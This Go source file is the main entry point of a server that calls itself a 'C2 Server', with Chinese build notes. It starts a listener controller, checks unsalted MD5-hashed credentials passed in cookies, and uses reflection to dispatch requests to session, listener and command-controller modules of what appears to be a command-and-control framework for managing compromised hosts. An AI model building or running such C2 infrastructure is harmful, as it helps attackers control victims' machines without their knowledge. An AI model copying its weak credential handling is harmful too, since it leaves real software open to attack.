package main

import (
	"Server/Public"
	"Server/SessionController"
	"Server/ToolBar"
	"crypto/md5"
	"encoding/hex"
	"fmt"
	"github.com/gin-gonic/gin"
	_ "github.com/mattn/go-sqlite3"
	"io"
	"log"
	"os"
	"reflect"
)

// 安装库:
// go mod init Server
// go get github.com/gin-gonic/gin
// go get github.com/mattn/go-sqlite3
// go-sqlite3 需要 GCC 的解决办法:
// 1.下载 https://github.com/mstorsjo/llvm-mingw/releases 中的 llvm-mingw-2024xxxx-ucrt-x86_64
// 2.将 bin 添加至环境变量
// 3.设置 CGO_ENABLED=1
// 4.重启编译器

// 编译:
// go build -ldflags "-s -w" -o Server.exe

func main() {
	if len(os.Args) != 4 {
		log.Fatal("Usage: Server [Port] [AccessKey] [Password]\nExample: Server 7777 1234 pass")
	}
	serverPort := os.Args[1]
	hash := md5.Sum([]byte(os.Args[2]))
	accessKey := hex.EncodeToString(hash[:])
	hash = md5.Sum([]byte(os.Args[3]))
	password := hex.EncodeToString(hash[:])
	fmt.Println("C2 Server have started, please use Client.")

	// 开启监听器
	SessionController.ListenerObj.RestartListener()

	gin.SetMode(gin.ReleaseMode)
	gin.DefaultWriter = io.Discard
	r := gin.Default()

	structMapping := map[string]interface{}{
		"Public.Update":                       Public.Update{},
		"ToolBar.SystemLog":                   ToolBar.SystemLog{},
		"ToolBar.ListenerConfig":              ToolBar.ListenerConfig{},
		"ToolBar.PendingSession":              ToolBar.PendingSession{},
		"SessionController.CommandController": SessionController.CommandController{},
	}

	// 路由
	r.POST("/", func(c *gin.Context) {
		// 检查 Cookie
		rAccessKey, err := c.Cookie("accessKey")
		if err != nil || rAccessKey != accessKey {
			ToolBar.WriteSystemLogInfo("C2 Server", "未授权访问路由: "+c.ClientIP())
			return
		}
		username, err := c.Cookie("username")
		if err != nil {
			ToolBar.WriteSystemLogInfo("C2 Server", "未授权访问路由: "+c.ClientIP())
			return
		}
		rPassword, err := c.Cookie("password")
		if err != nil || rPassword != password {
			ToolBar.WriteSystemLogInfo("C2 Server", "未授权访问路由: "+c.ClientIP())
			return
		}

		packageName := c.Query("packageName")
		structName := c.Query("structName")
		funcName := c.Query("funcName")

		if funcName == "Login" {
			c.String(200, "success")
			ToolBar.WriteSystemLogInfo(username, "用户登录")
			return
		}

		// 反射调用
		structObj := structMapping[packageName+"."+structName]
		structType := reflect.TypeOf(structObj)
		funcObj, exist := structType.MethodByName(funcName)
		if exist {
			args := []reflect.Value{reflect.ValueOf(structObj), reflect.ValueOf(username), reflect.ValueOf(c)}
			funcObj.Func.Call(args)
		}
	})

	r.GET("/", func(c *gin.Context) {
		ToolBar.WriteSystemLogInfo("C2 Server", "未授权访问路由: "+c.ClientIP())
		return
	})

	r.Run(":" + serverPort)
}
